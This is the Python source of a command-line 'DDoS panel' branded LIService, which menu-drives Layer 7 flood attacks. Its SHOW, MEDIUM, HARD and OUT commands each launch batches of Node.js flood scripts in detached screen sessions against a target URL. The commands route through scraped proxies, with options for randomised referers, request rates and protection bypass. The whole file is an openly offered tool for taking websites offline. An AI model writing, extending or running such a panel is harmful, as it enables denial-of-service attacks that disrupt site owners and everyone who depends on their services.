import os
import sys
import getpass
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def logo():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | MAIN MENU \x07")
	print("""Development By t.me/LIService | Ownered By t.me/Lintar21 | TYPE [help]
	
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝
                            """)
def methods():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | LIST METHODS \x07")
	print("""
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝
              

 • SHOW    | Use for show off power ddos | Layer7
 • MEDIUM  | Used for general sites | Layer7
 • HARD    | Used for continuous protection sites  | Layer7
 • OUT     | A dangerous mixed | Layer7
 • PROXY  | Proxies grab Or proxies scrape | Tools
 • STOP   | Stoping all attack | Tools
 • CREDIT | Credits panel D.D.o.S | Tools
 • SETUP  | Setup panel ddos| Tools 
 ! If you want to use comments, use lowercase letters
""")

def main():
    logo()
    while(True):
        cnc = input('''Panel•DDoS[LIService]-> ''')
        if cnc.lower() == "methods":
            methods()
        elif cnc.lower() in ["clear", "cls"]:
            main()
        elif cnc.lower() == "help":
            methods()
        elif cnc.lower() == "stop":
            os.system('pkill screen')
            print("Stops All Attacks")
        elif cnc.lower() == "setup":
            os.system("python3 installer.py")
            print("Done")
        elif cnc.lower() == "proxy":
            os.system(f'cd Layer7 && python3 LIService-Scrape.py')
        elif "show" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node SC11 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC12 {host} {attack_time}')
                os.system(f'cd Layer7 && screen -dm node SC1 {host} {attack_time} 64 10 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC4 GET {host} {attack_time} 64 10 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                os.system(f'cd Layer7 && screen -dm node SC9 {host} {attack_time} 64 10 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: SHOW
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: SHOW <url> <time>')
                print('Example: SHOW http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        # Duplicate code removed, conditions optimized
        elif "medium" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node SC1 {host} {attack_time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC2 {host} {attack_time} 8 2 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC4 GET {host} {attack_time} 8 1 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                os.system(f'cd Layer7 && screen -dm node SC6 {host} {attack_time} 8 2 proxy.txt --input bypass')
                os.system(f'cd Layer7 && screen -dm node SC7 {host} {attack_time} 8 1 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC9 {host} {attack_time} 8 3 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: MEDIUM
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: MEDIUM <url> <time>')
                print('Example: MEDIUM http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "hard" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node SC1 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC2 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC4 GET {host} {attack_time} 8 8 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                os.system(f'cd Layer7 && screen -dm node SC6 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC7 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC9 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC11 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC12 {host} {attack_time}')
                os.system(f'cd Layer7 && screen -dm node SC10 GET {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: HARD
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: HARD <url> <time>')
                print('Example: HARD http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "out" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node SC1 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC2 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC4 GET {host} {attack_time} 8 8 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                os.system(f'cd Layer7 && screen -dm node SC4 POST {host} {attack_time} 8 8 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                os.system(f'cd Layer7 && screen -dm node SC6 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC7 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC9 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC13 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC11 {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC12 {host} {attack_time}')
                os.system(f'cd Layer7 && screen -dm node SC10 GET {host} {attack_time} 8 8 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node SC10 POST {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: OUT
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: out <url> <time>')
                print('Example: out http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')
                
        elif cnc.lower() == "credit":
            print("""[System] | Welcome LIService Panel DDoS | Development By t.me/LIService | Ownered By t.me/Lintar21 | Type [HELP]""")

        else:
            print(f"Command [{cnc}] Not Found. Type [HELP] to show commands.")

main()
